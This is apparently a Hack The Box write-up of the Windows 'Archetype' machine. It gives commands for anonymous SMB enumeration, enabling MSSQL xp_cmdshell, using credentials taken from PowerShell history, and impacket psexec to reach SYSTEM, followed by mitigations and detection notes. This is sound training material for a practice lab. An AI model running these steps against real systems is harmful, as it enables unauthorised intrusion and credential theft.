---
machine: Archetype
os: Windows
difficulty: Very Easy
platform: Hack The Box
category: Starting Point
state: Available
pwned: 2026-11-10
tags: [windows, smb, mssql, xp_cmdshell, psexec, tier2]
---

# Archetype — Hack The Box

**English** | [🇪🇸 Español](README.md)

> **State:** Available · Starting Point · Tier 2 · Windows · Very Easy

## TL;DR

The `backups` share over a null session hands out `prod.dtsConfig` with `sql_svc`'s password. MSSQL plus `xp_cmdshell` gives a shell, the PowerShell history stores `Administrator`'s password, and `psexec` finishes as **SYSTEM**.

---

## Recon

```bash
nmap -Pn -sV -p- --min-rate 1000 <TARGET_IP>
```

```text
135/tcp  msrpc
139/tcp  netbios-ssn
445/tcp  microsoft-ds
1433/tcp Microsoft SQL Server 2019
```

## Enumeration

```bash
smbclient -N -L //<TARGET_IP>
smbclient -N //<TARGET_IP>/backups
smb: \> get prod.dtsConfig
```

```xml
<ConfiguredValue>Data Source=.;Password=<PASSWORD>;User ID=ARCHETYPE\sql_svc;...</ConfiguredValue>
```

- The non-admin `backups` share is reachable without credentials.
- The file is an SSIS configuration: cleartext service credentials.

## Foothold

```bash
impacket-mssqlclient ARCHETYPE/sql_svc:'<PASSWORD>'@<TARGET_IP> -windows-auth
```

```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';
```

```text
archetype\sql_svc
```

Download a PowerShell reverse shell and run it through `xp_cmdshell`; the shell lands as `sql_svc`.

## Lateral movement

```powershell
type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

```text
net use T: \\Archetype\backups /user:administrator <ADMIN_PASSWORD>
```

The administrator mounted the share from a console and PSReadLine saved the password in cleartext.

## Privilege escalation

```bash
impacket-psexec administrator:'<ADMIN_PASSWORD>'@<TARGET_IP>
```

```text
nt authority\system
```

- `psexec` writes to `ADMIN$` and creates a temporary service.
- Flags: `C:\Users\sql_svc\Desktop\user.txt` and `C:\Users\Administrator\Desktop\root.txt`.

## Evidence

- `prod.dtsConfig` with the password redacted.
- PowerShell history redacted and `whoami` as SYSTEM.

## Lessons learned

- A "backup" share usually holds configuration with secrets.
- `xp_cmdshell` is disabled by default but a `sysadmin` re-enables it in two lines.
- PSReadLine history is a first-class credential artefact.
- `-windows-auth` is required when the instance uses integrated authentication.

## Mitigations and detection

- No null-session shares; encrypt SSIS secrets (`/e` or Key Vault).
- `sql_svc` without `sysadmin`; `xp_cmdshell` disabled and audited.
- Clear histories and never type passwords on the command line.
- Detection: anomalous 4624 type 3, `xp_cmdshell` in the SQL log, 7045 service creation after SMB.

- CWE-522, CWE-269
- MITRE ATT&CK: [T1552.001](https://attack.mitre.org/techniques/T1552/001/), [T1059.001](https://attack.mitre.org/techniques/T1059/001/), [T1569.002](https://attack.mitre.org/techniques/T1569/002/)

## References

- [Impacket — mssqlclient.py](https://github.com/fortra/impacket)
- [HackTricks — MSSQL](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
